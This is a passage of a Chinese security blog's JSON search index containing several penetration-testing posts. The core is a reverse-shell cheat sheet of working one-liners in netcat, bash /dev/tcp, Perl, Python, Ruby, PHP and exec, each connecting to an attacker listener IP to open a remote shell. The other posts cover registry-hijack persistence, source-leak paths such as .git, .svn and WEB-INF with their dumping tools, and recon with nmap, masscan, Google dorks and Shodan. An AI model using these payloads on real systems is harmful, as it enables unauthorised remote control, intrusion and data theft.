Option”注册表路径中的程序名称其它适用于的辅助功能还有：屏幕键盘：C:\\Windows\\System32\\osk.exe放大镜：C:\\Windows\\System32\\Magnify.exe旁白：C:\\Windows\\System32\\Narrator.exe显示开关：C:\\Windows\\System32\\DisplaySwitch.exe应用程序开关：C:\\Windows\\System32\\AtBroker.exe现在大部分的杀毒软件都会监视注册表项来防御这种恶意行为。现在大部分的杀毒软件都会监视注册表项来防御这种恶意行为。本文复现主要用来学习，请勿用于非法用途。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[]},{"title":"各种环境下反弹shell","slug":"各种环境下反弹shell","date":"2019-06-21T04:01:35.000Z","updated":"2020-07-04T09:54:31.612Z","comments":true,"path":"2019/06/21/各种环境下反弹shell/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/21/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"0x00 NC命令详解在介绍如何反弹shell之前，先了解相关知识要点。nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流可运行在TCP或者UDP模式，添加参数 —u 则调整为udP，默认为tcp，详细参数如下-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。-h 在线帮助。-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。-l 使用监听模式，管控传入的资料。-n 直接使用IP地址，而不通过域名服务器。-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p&lt;通信端口&gt; 设置本地主机使用的通信端口。-r 乱数指定本地与远端主机的通信端口。-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。-u 使用UDP传输协议。-v 显示指令执行过程。-w&lt;超时秒数&gt; 设置等待连线的时间。-z 使用0输入/输出模式，只在扫描通信端口时使用。1$ nc -v 172.31.100.7 21netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。1、使用nc聊天1$nc -l 1567netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。1$nc 172.31.100.7 1567不管你在机器B上键入什么都会出现在机器A上。实测好像并不可以…2、nc进行文件传输Server:1$nc -l 1567 &lt; file.txt &#96;&#96;&#96; Client: &#96;&#96;&#96; $nc -n 172.31.100.7 1567 &gt; file.txt好像也不行…不管这些还是直接来反弹shell吧0x01 NC1、正向反弹shell服务器端1nc -lvvp 7777 -e &#x2F;bin&#x2F;bash本地1nc 192.168.242.129 7777即可获得服务器端的shell2、反向反弹shell服务端1nc -e &#x2F;bin&#x2F;bash 192.168.242.1 7777本地1nc -lvvp 7777不使用-e参数反弹使用管道服务端12mknod &#x2F;tmp&#x2F;backpipe p &#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe攻击端1nc -lnvp 7777mknod需要root用户，但是也可以通过mkfifo /tmp/backpipe也可以创建一个管道。0x02 Bash服务端：123bash -c &#39;sh -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;210.28.30.887&#x2F;53 0&gt;&amp;1&#39;或者bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.1&#x2F;7777 0&gt;&amp;1攻击端1nc -lvvp 77770x03 Perl第一种方式（linux）12perl -e &#39;use Socket;$i&#x3D;&quot;192.168.242.1&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; 本地：nc -nvlp 7777第二种方式（linux）1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.242.1:7777&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;第三种方式（windwos）1perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;0x04 Python12python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.27.32.227&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 本地：nc -nvlp 77770x05 ruby第一种方式1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)一次性连接，连上就断，换上 msd 监听也是这样第二种（linux）1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)一次性连接，连上就断，换上 msf 监听也是这样第三种方式（windwos）1ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;10.10.10.166&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;0x06 PHP12php -r &#39;$sock&#x3D;fsockopen(&quot;10.10.10.166&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;本地 nc -nvlp 44440x07 exec第一种方式123exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done本地：nc -nvlp 4444第二种方式120&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444; sh &lt;&amp;196&gt;&amp;196 2&gt;&amp;196 本地 nc -nvlp 44440x08 原生的 shell 切换交互式 bash123456root@kali:~# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.10.166] from (UNKNOWN) [10.10.10.50] 39840 $ $ $ $ python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; kevin@ubuntu:~$0x09 最后个人觉得这几种应该就够用了，至于其他环境，再看具体情况吧，有一些环境服务器不一定有的参考链接：https://www.cnblogs.com/deen-/p/7237327.htmlhttps://blog.csdn.net/Kevinhanser/article/details/88920278","categories":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"http://blog.qianxiao996.cn/tags/%E5%8F%8D%E5%BC%B9shell/"}]},{"title":"信息泄露总结","slug":"信息泄露总结","date":"2019-06-15T10:30:15.000Z","updated":"2020-07-04T09:49:41.993Z","comments":true,"path":"2019/06/15/信息泄露总结/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/15/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/","excerpt":"","text":"在渗透测试过程中，由于网站配置不当，或者代码逻辑错误，往往会泄露一些敏感信息，本文对此做一个总结，欢迎各位补充。01、Apache样例文件泄露apache 的一些样例文件没有删除，可能存在可能存在cookie、session伪造，进行后台登录操作。常见的路径有：1234http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;CookieExamplehttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;RequestHeaderExamplehttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;jsp&#x2F;snp&#x2F;snoop.jsphttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;async&#x2F;async102、IIS短文件名工具：https://github.com/lijiejie/IIS_shortname_Scanner利用：03、字段加[] 造成信息泄露网站所有参数均存在，把参数变为数组即可报错出网站绝对路径。比如：04、修改请求方法将get方法改为put 程序就报错，泄漏网站绝对路径。比如：当然，也可修改位其他方法，多fuzz。05、war文件信息泄露war文件信息泄露是指部署在war文件由于配置不当，导致其整个报文件以及其他重要的配置文件信息泄露，例如可以直接浏览目录，获取其下面的配置文件：WEB-INF/jdbc.properties,jdbc.properties为数据库链接配置文件。包含数据库链接的账户和密码等重要信息。比如：java 一般重要的配置文件位于 WEB-INF 目录下，其常见的重要的配置文件有：1234567config&#x2F;config.propertiesconfigure&#x2F;configure.propertiesapplicationContext.xmlsysconfig.propertiesweb.xmlconfig.xmljdbc.properties06、swagger常见路径：12345&#x2F;swagger-ui.html&#x2F;swagger&#x2F;swagger-ui.html&#x2F;api&#x2F;swagger-ui.html&#x2F;v1.x&#x2F;swagger-ui.html&#x2F;swagger&#x2F;index.htmlhttps://datax.yahoo.com/%20/。然后我看到了以下页面。07、Tomcattomcat 后缀改成大写，会显示源码，只要把jsp文件后缀名改为大写就可以比如：08、阿里云oosaccesskey泄露上传文件处，在返回包中直接显示了阿里oss静态服务器的OSSAccessKeyId的值，导致信息泄漏 。09、j2ee应用异常信息Java异常处理机制（Exception）简要说明：Java中它是由Trowable类的两个子类的两大部分组成，Error类和Exception类。Error是不推荐捕获的（请查看Java异常处理机制中Error与Exception的区别），而Exception类除了子类RuntimeException是不能被捕获，其他子类的异常必须捕获，简单来讲，就产生异常信息了。但Exception产生异常信息的过程有个特点，当发生异常时，异常抛给调用该函数的上一级函数，直到出现包含异常处理（catch）的层为止，这个给开发者在程序调试中带来很大的方便，能够快速定位问题所在等形成XSS的场景：与上面场景不同的地方有两个：1、如果开发者自己处理了异常信息但还是向用户抛出（在实际开发中这情况还不少，还做个用户体验页面，让用户把这些异常信息反馈给管理员（当然，开发者本意是好的！）。）2、带有用户输入而又未做XSS防御处理的数据（攻击者的恶意代码）。当然，如果最后默认是交给容器处理输出，是不会有这问题，如图：10、源代码泄露(1).Mercurial .hg 源码泄露hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件eg:1http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;工具：1https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper使用：1rip-hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;(2).git 源码泄露在运行 git init 的时候，在当前目录下会产生一个.git 文件。eg:1http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;工具：Githack1githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;(3).DS_Store 文件泄露在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。eg:1http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;工具：1https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;ds_store_exp使用：1ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;(4).svn 源代码泄露使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。eg:1http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;entries工具：seay-Svn(5).cvs文件泄露12http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Root 返回根信息http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Entries 返回所有文件结构(6).bazaarbazaar信息泄露bazaarbazaar是一个版本控制系统，可以追踪项目历史eg:1http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;工具：1https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper使用：1rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;(7).WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。12345&#x2F;WEB-INF&#x2F;web.xml&#x2F;WEB-INF&#x2F;classes&#x2F;&#x2F;WEB-INF&#x2F;lib&#x2F;&#x2F;WEB-INF&#x2F;src&#x2F;&#x2F;WEB-INF&#x2F;database.properties11、总结以上是笔者学习中遇到的，欢迎各位大佬继续补充。","categories":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"渗透测试之信息收集","slug":"渗透测试之信息收集","date":"2019-06-11T03:30:15.000Z","updated":"2020-07-04T09:37:26.907Z","comments":true,"path":"2019/06/11/渗透测试之信息收集/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"一、DNS1、A记录ping nslookupdig 域名dig -t a baidu.com2、NS记录（DNS服务器）dig -t NS 域名3、MX记录（邮件服务器）dig -t MX baidu.com4、CNAME记录（别名）dig -t CNAME baidu.com5、whois查询（域名信息查询）whois.chinaz.comwhois.iana.orgwww.arin.netwho.iscentralops.netwww.17ce.com二、子域名1、爆破dnsmap baidu.com -w 字典dnsmap默认字典 /usr/share/dnsmap/wordlist_TLAs.txtfuzzDomain 工具Layer子域名挖掘机2、搜索引擎google hacker 语法site:baidu.com3、kali下：theharvesterproxychains theharvester -d baidu.com -b allproxychains 加代理AQUATONE工具发现 proxychains aquatone-discover -d 域名 -t 10（线程）扫描 proxychains aquatone-scan-d 域名 -t 10（线程）收集 proxychains aquatone-gather -d 域名 -t 10（线程）4、域传送1fierce -dns baidu.com （域名有DNS服务器才能用）5、在线网站www.virustotal.comdnsdumpster.comphpinfo.me三、C段1、Namp扫描Nmap-扫描C段主机存活1234Nmap -sn -PE -n 192.168.1.1&#x2F;24 -oX out.xml -sn不扫描端口 -PE ICMP扫描 -n不进行dns解析Nmap-定向端口扫描123Nmap -sS -Pn -p 3389 ip 扫描方式：半开放扫描 -Pn 不进行主机存活探测Nmap-全端口扫描12Nmap -sS -Pn -p 1-65535 -n ip 扫描方式：半开放扫描Nmap-服务扫描123Nmap -sS -sV -p 1-65535 -n ip 扫描方式：半开放扫描 显示出端口开发的服务2、MasscanMasscan-安装12345sudo apt-get install git gcc make libpcap-dev（安装必备环境，kali已经默认安装完成）git clonehttps:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscancd masscanmake（编译）Masscan-使用12345678910Masscan -p 80 192.168.1.1&#x2F;24 --rate 1000 -oL output.txt -p设置端口 --rate发包速率 -oL输出位置为了绕过扫描特定ip，可以添加-excludefile Masscan-p 80 ip --excludefile special.txt 自定多种格式输出 -oX输出xml -oJ输出json格式 -oL输出简单列表Masscan-注意问题12扫描选项中必须添加端口-p、--ports 1-65535目标主机是IP地址，不是域名Masscan-总结123Masscan&#x3D;&#x3D;namp-sS-Pn-n-randomize-hosts-send-eth速率：可以执行最高300、000个数据包每秒注册账号能找到服务器地址四、web目录扫描1、robots.txt文件https://baidu.com/robots.txt2、搜索引擎site: baidu.com3、爆破dirb (kali下)ddirb https://baidu.com爆破一DIRB参数：设置User-Agent-b不扫描./或者./-c设置Cookie-E设置证书文件-o outfile_file保存扫描文件dirbuster（kali下） （不推荐，已经停止更新）4、御剑后台扫描（自行下载）五、 指纹1、指纹识别12nmap -sS -Pn -O ipnmap -sS -sV ip2、中间件指纹识别123方法一： 通过http返回消息中提取server字段方法二： nmap -sS -Pn -sV ip 方法三： 构造错误界面返回信息查看中间件3、web程序指纹识别开发语言1234URL 后缀名识别 .asp .php .jsp抓包，查看与后台交互点http返回消息头 x-Powered-Bycookie可以识别， PHPSESSION --&gt;PHP JSPSESSION --&gt; JSP ASPSESSIONIDAASTCACQ --&gt;ASP开发框架1234567php的thinkphp框架识别方法特定ico图标Action后缀 90%几率struts2或者webworkdo后缀 50%几率spring mvcurl路径&#x2F;action&#x2F;xxx70%几率struts2form后缀 60%几率spring mvcVm后缀 90%几率VelocityViewServletjsf后缀 99%几率Java Server Faces第三方组件1234一般包括流量统计、文件编辑器、模板引擎识别方法：一般目录扫描FCKeditor CKEditorCMS程序1234特定文件夹dede&#x2F;、admin&#x2F;admin_Login.aspxPowered by***网站favicon图标数据库123常规判断，asp-&gt;sql server，php-&gt;mysql，jsp-oracle网站错误信息端口服务，1443-&gt;sql server，3306-&gt;mysql，oracal-&gt;1521在线探测12wappalyzer插件云悉： http:&#x2F;&#x2F;www.yunsee.cn4、防火墙指纹识别1234nmap -p 80 域名 --script http-waf-fingerprintsqlmap -u 360.cn --identify-wafwafw00f工具 https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00fpython setup.py install 或者 pip install wafw00f六、GoogleHacking1、语法1234567+ 强制搜索其后的一个单词- 把某个字忽略~ 同意词. 单一的通配符* 通配符，可代表多个字母&quot; &quot; 精确查询&quot;|&quot;或&quot;OR&quot; 只要符合多个关键字中的任意一个的结果予以显示2、基本用法12345678910intext:key 搜索网页带有关键字的页面allintext:key 功能与intext，但是可以接多个关键字intitle:key 搜索网页标题中是否有所输入的文字allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用cache:url 查看指定URL快照filetype： 搜索指定类型文件info: 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用inurl: 搜索输入字符是否存在于URL中，可以与site结合找后台site： 搜索特定网站或者子域名related:URL 搜索与该URL相关的页面3、高级用法123456site： 特定网站搜索，可以寻找子域名、域名、端口site: URL filetype:doc 搜索与该域名相关的doc文件site: URL filetype:doc 搜索与该域名相关的doc文件site: URL intitle： 登录搜索与该域名相关联关键词的网页site: URL inurl:&#x2F;login 搜索与该域名相关URL的网页site：36.110.213.* C段快速探测Google hacking语法收集网站 https://www.exploit-db.com/google-hacking-database/us七、网络空间搜索引擎1shodan：www.shodan.io1、基本语法1234567891011hostname:&quot;360.cn&quot; 主机名port：23 搜索端口net：192.168.1.0&#x2F;24 CIDR格式的IP地址city:&quot;San Diego&quot; 城市product:&quot;Apache httpd” version:&quot;2.6.1” 软件版本os:“Windows7&quot; 操作系统country:&quot;CN” 国家简写org:&quot;google” 组织isp:&quot;China Telecom&quot; ISP服务商geo:&quot;38.4681，106.2731”2、基本使用1234搜索开放80端口的主机 port：80搜索开放80端口的主机，并且服务器是nginx port：80 product:&quot;nginx”C段探测 net:ip&#x2F;24搜索favicon:http.favicon.hash:-395680774 这里搜索的是标题栏的图标3、其他钟馗之眼 http://www.zoomeye.orgfafo http://www.zoomeye.org","categories":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://blog.qianxiao996.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CVE漏洞","slug":"CVE漏洞","permalink":"http://blog.qianxiao996.cn/tags/CVE%E6%BC%8F%E6%B4%9E/"},{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"后门","slug":"后门","permalink":"http://blog.qianxiao996.cn/tags/%E5%90%8E%E9%97%A8/"},{"name":"MSF","slug":"MSF","permalink":"http://blog.qianxiao996.cn/tags/MSF/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://blog.qianxiao996.cn/tags/phpmyadmin/"},{"name":"文件下载","slug":"文件下载","permalink":"http://blog.qianxiao996.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"name":"反弹shell","slug":"反弹shell","permalink":"http://blog.qianxiao996.cn/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}